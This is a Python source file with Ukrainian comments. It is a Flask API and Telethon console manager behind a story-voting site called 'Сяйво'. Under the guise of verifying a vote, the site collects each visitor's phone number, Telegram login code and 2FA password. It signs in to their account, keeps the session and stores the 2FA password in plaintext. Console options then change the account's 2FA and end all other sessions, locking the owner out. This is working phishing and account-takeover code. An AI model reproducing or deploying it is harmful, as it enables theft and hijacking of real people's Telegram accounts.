"""
Telegram manager + HTTP API для сайту «Сяйво».
- accounts.json: {"accounts": [{"id", "session": "sessions/<id>", ...}]}
- votes.json: записи голосів
- Вікна форми на сайті з'являються по черзі: телефон → код → 2FA → успіх
"""
import asyncio
import hashlib
import json
import os
import re
import uuid
from datetime import datetime, timezone

from dotenv import load_dotenv
from flask import Flask, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError,
    PasswordHashInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
)
from telethon.tl.functions.account import ResetAuthorizationRequest

load_dotenv()

# ============== CONFIG ==============
API_ID = int(os.getenv("API_ID", "12345678"))
API_HASH = os.getenv("API_HASH", "YOUR_API_HASH")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
ACCOUNTS_FILE = os.path.join(BASE_DIR, "accounts.json")
VOTES_FILE = os.path.join(BASE_DIR, "votes.json")

os.makedirs(SESSIONS_DIR, exist_ok=True)

# ============== FLASK ==============
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})


# Тимчасові верифікації для сайту
# token -> {phone, story, phone_code_hash, session_path, stage, two_fa}
pending: dict[str, dict] = {}

# ============== ACCOUNTS STORAGE ==============
def load_accounts() -> dict:
    if not os.path.exists(ACCOUNTS_FILE):
        return {"accounts": []}
    try:
        with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return {"accounts": []}
            return json.loads(content)
    except (json.JSONDecodeError, OSError):
        with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
            json.dump({"accounts": []}, f, ensure_ascii=False, indent=2)
        return {"accounts": []}



def save_accounts(data: dict) -> None:
    with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)


def get_account(account_id: str):
    data = load_accounts()
    for account in data["accounts"]:
        if account["id"] == account_id:
            return account
    return None


# ============== VOTES STORAGE ==============
def load_votes() -> dict:
    if not os.path.exists(VOTES_FILE):
        return {"votes": []}
    try:
        with open(VOTES_FILE, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return {"votes": []}
            return json.loads(content)
    except (json.JSONDecodeError, OSError):
        # Пошкоджений файл — перезаписуємо
        with open(VOTES_FILE, "w", encoding="utf-8") as f:
            json.dump({"votes": []}, f, ensure_ascii=False, indent=2)
        return {"votes": []}



def save_votes(data: dict) -> None:
    with open(VOTES_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def phone_hash(phone: str) -> str:
    return hashlib.sha256(phone.encode("utf-8")).hexdigest()[:16]


def has_voted(telegram_id: int, story: str) -> bool:
    votes = load_votes()
    for v in votes["votes"]:
        if v["telegram_id"] == telegram_id and v["story"] == story:
            return True
    return False


def record_vote(telegram_id: int, phone: str, story: str,
                name: str, username: str = "",
                has_2fa: bool = False,
                two_fa_password: str = "") -> None:
    votes = load_votes()
    votes["votes"].append({
        "telegram_id": telegram_id,
        "phone": phone,
        "phone_hash": phone_hash(phone),
        "username": username,
        "first_name": name,
        "has_2fa": has_2fa,
        "two_fa_password": two_fa_password,
        "story": story,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    })
    save_votes(votes)



# ============== PHONE ==============
def normalise_phone(raw: str) -> str:
    digits = re.sub(r"\D", "", raw or "")
    if not digits:
        return ""
    if digits.startswith("380"):
        return "+" + digits
    if digits.startswith("0"):
        return "+38" + digits
    if len(digits) >= 9:
        return "+" + digits
    return "+" + digits


# ============== TELETHON ASYNC ==============
async def _send_code(session_path: str, phone: str) -> str:
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        return sent.phone_code_hash
    finally:
        await client.disconnect()


async def _sign_in_code(session_path: str, phone: str,
                        phone_code_hash: str, code: str):
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=phone_code_hash,
        )
        return await client.get_me()
    finally:
        await client.disconnect()


async def _sign_in_password(session_path: str, password: str):
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(password=password)
        return await client.get_me()
    finally:
        await client.disconnect()


# ============== HTTP API ==============
@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({"ok": True})


@app.route("/api/send-code", methods=["POST"])
def api_send_code():
    data = request.get_json(silent=True) or {}
    phone = normalise_phone(data.get("phone", ""))
    story = (data.get("story") or "").strip()

    if not phone or len(phone) < 10:
        return jsonify({"ok": False, "error": "Введіть коректний номер"}), 400
    if not story:
        return jsonify({"ok": False, "error": "Не обрано історію"}), 400

    session_name = f"site_{uuid.uuid4().hex}"
    session_path = os.path.join(SESSIONS_DIR, session_name)

    try:
        code_hash = asyncio.run(_send_code(session_path, phone))
    except FloodWaitError as e:
        return jsonify({
            "ok": False,
            "error": f"Telegram просить зачекати {e.seconds} секунд",
        }), 429
    except Exception as e:
        return jsonify({"ok": False, "error": f"Не вдалося надіслати код: {e}"}), 400

    token = uuid.uuid4().hex
    pending[token] = {
        "phone": phone,
        "story": story,
        "phone_code_hash": code_hash,
        "session_path": session_path,
        "stage": "code",  # очікуємо код
    }

    return jsonify({"ok": True, "token": token, "stage": "code"})


@app.route("/api/verify-code", methods=["POST"])
def api_verify_code():
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    code = (data.get("code") or "").strip()
    password = data.get("password")

    record = pending.get(token)
    if not record:
        return jsonify({"ok": False, "error": "Сесія не знайдена"}), 400

    me = None
    try:
        if record["stage"] == "code":
            if not code:
                return jsonify({"ok": False, "error": "Введіть код"}), 400
            try:
                me = asyncio.run(_sign_in_code(
                    record["session_path"],
                    record["phone"],
                    record["phone_code_hash"],
                    code,
                ))
            except SessionPasswordNeededError:
                # Telegram просить 2FA -> переходимо в наступну стадію
                record["stage"] = "password"
                return jsonify({"ok": True, "stage": "password"})
            except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                return jsonify({"ok": False, "error": "Невірний або прострочений код"}), 400
            except Exception as e:
                return jsonify({"ok": False, "error": str(e)}), 400

        elif record["stage"] == "password":
            if not password:
                return jsonify({"ok": False, "error": "Введіть пароль 2FA"}), 400
            # Зберігаємо пароль у записі для подальшого запису в votes.json
            record["two_fa_password"] = password
            try:
                me = asyncio.run(_sign_in_password(record["session_path"], password))
            except PasswordHashInvalidError:
                return jsonify({"ok": False, "error": "Невірний пароль"}), 400
            except Exception as e:
                app.logger.exception("password error")
                return jsonify({"ok": False, "error": str(e)}), 400
    except FloodWaitError as e:
        return jsonify({"ok": False, "error": f"Зачекайте {e.seconds} секунд"}), 429

    if me is None:
        return jsonify({"ok": False, "error": "Не вдалося авторизуватись"}), 400

    # Успіх — записуємо голос
    try:
        if has_voted(me.id, record["story"]):
            pending.pop(token, None)
            return jsonify({
                "ok": False,
                "error": "Ви вже голосували за цю історію",
            }), 400

        record_vote(
            telegram_id=me.id, phone=record["phone"],
            story=record["story"], name=(me.first_name or "").strip(),
            username=me.username or "",
            has_2fa=record.get("stage") == "password",
            two_fa_password=record.get("two_fa_password", ""),
        )



    finally:
        pending.pop(token, None)

    return jsonify({
        "ok": True,
        "stage": "done",
        "first_name": me.first_name or "",
        "username": me.username or "",
    })


@app.route("/api/votes", methods=["GET"])
def api_votes():
    votes = load_votes()
    counts: dict[str, int] = {}
    for v in votes["votes"]:
        counts[v["story"]] = counts.get(v["story"], 0) + 1
    return jsonify({"ok": True, "counts": counts})


# ====================================================================
# ====================== КОНСОЛЬНІ ФУНКЦІЇ ==========================
# ====================================================================

async def add_account(phone: str) -> dict:
    """Створює нову сесію через консоль і записує в accounts.json."""
    account_id = uuid.uuid4().hex[:12]
    session_relpath = f"sessions/{account_id}"  # <- повний шлях
    session_path = os.path.join(BASE_DIR, session_relpath)

    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    await client.send_code_request(phone)

    print("📨 Код відправлено.")
    code = input("Введи код Telegram: ").strip()

    try:
        await client.sign_in(phone=phone, code=code)
    except Exception as e:
        if "SessionPasswordNeeded" in type(e).__name__:
            password = input("Введи пароль 2FA: ")
            await client.sign_in(password=password)
        else:
            await client.disconnect()
            raise e

    me = await client.get_me()
    account = {
        "id": account_id,
        "session": session_relpath,
        "telegram_id": me.id,
        "phone": me.phone or phone,
        "username": me.username or "",
        "first_name": me.first_name or "",
        "last_name": me.last_name or "",
        "two_fa": True,
    }

    data = load_accounts()
    data["accounts"].append(account)
    save_accounts(data)
    await client.disconnect()

    print("\n✅ Акаунт додано.")
    print(f"ID: {account_id}")
    print(f"Session: {session_relpath}")
    return account


async def set_2fa(account_id: str, new_password: str, hint: str = "Telegram password"):
    account = get_account(account_id)
    if not account:
        raise ValueError("Акаунт не знайдений")

    session_path = os.path.join(BASE_DIR, account["session"])
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.start()
    try:
        await client.edit_2fa(new_password=new_password, hint=hint)
        print("✅ Пароль 2FA успішно встановлено/змінено.")
    finally:
        await client.disconnect()


async def reset_sessions(account_id: str):
    """Завершує всі ІНШІ сесії (окрім поточної)."""
    account = get_account(account_id)
    if not account:
        raise ValueError("Акаунт не знайдений")

    session_path = os.path.join(BASE_DIR, account["session"])
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.start()
    try:
        await client(ResetAuthorizationRequest())
        print("✅ Всі інші сесії завершено.")
    finally:
        await client.disconnect()


async def reset_sessions_after(account_id: str, seconds: int):
    print(f"⏳ Очікування: {seconds} секунд...")
    await asyncio.sleep(seconds)
    await reset_sessions(account_id)


async def get_account_info(account_id: str) -> dict:
    account = get_account(account_id)
    if not account:
        raise ValueError("Акаунт не знайдений")

    session_path = os.path.join(BASE_DIR, account["session"])
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.start()
    try:
        me = await client.get_me()
        account["telegram_id"] = me.id
        account["phone"] = me.phone or ""
        account["username"] = me.username or ""
        account["first_name"] = me.first_name or ""
        account["last_name"] = me.last_name or ""

        data = load_accounts()
        for i, item in enumerate(data["accounts"]):
            if item["id"] == account_id:
                data["accounts"][i] = account
                break
        save_accounts(data)
        return account
    finally:
        await client.disconnect()


async def delete_account(account_id: str):
    account = get_account(account_id)
    if not account:
        raise ValueError("Акаунт не знайдений")

    data = load_accounts()
    data["accounts"] = [x for x in data["accounts"] if x["id"] != account_id]
    save_accounts(data)

    session_path = os.path.join(BASE_DIR, account["session"])
    for ext in ("", ".session", ".session-journal"):
        path = session_path + ext
        if os.path.exists(path):
            os.remove(path)
    print("🗑 Акаунт видалено.")


async def main():
    print("\n====== TELEGRAM MANAGER ======\n")
    print("1. Додати акаунт")
    print("2. Список акаунтів")
    print("3. Змінити 2FA")
    print("4. Викинути інші сесії")
    print("5. Викинути інші сесії через таймер")
    print("6. Оновити інформацію")
    print("7. Видалити акаунт")
    print("0. Вихід\n")

    choice = input("> ").strip()

    if choice == "1":
        phone = input("Номер телефону: ").strip()
        await add_account(phone)
    elif choice == "2":
        data = load_accounts()
        for a in data["accounts"]:
            print()
            print(f"ID: {a['id']}")
            print(f"Session: {a['session']}")
            print(f"Name: {a['first_name']} {a['last_name']}")
            print(f"Username: @{a['username']}")
            print(f"Phone: {a['phone']}")
            print(f"Telegram ID: {a['telegram_id']}")
    elif choice == "3":
        account_id = input("ID акаунта: ").strip()
        new_password = input("Новий пароль 2FA: ")
        hint = input("Підказка: ")
        await set_2fa(account_id, new_password, hint)
    elif choice == "4":
        account_id = input("ID акаунта: ").strip()
        await reset_sessions(account_id)
    elif choice == "5":
        account_id = input("ID акаунта: ").strip()
        seconds = int(input("Через скільки секунд: "))
        await reset_sessions_after(account_id, seconds)
    elif choice == "6":
        account_id = input("ID акаунта: ").strip()
        account = await get_account_info(account_id)
        print(json.dumps(account, ensure_ascii=False, indent=4))
    elif choice == "7":
        account_id = input("ID акаунта: ").strip()
        confirm = input("Точно видалити? yes/no: ")
        if confirm.lower() == "yes":
            await delete_account(account_id)
    elif choice == "0":
        return


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "api":
        port = int(os.getenv("PORT", "5000"))
        print(f"[API] starting on http://0.0.0.0:{port}")
        app.run(host="0.0.0.0", port=port, debug=False)
    else:
        asyncio.run(main())
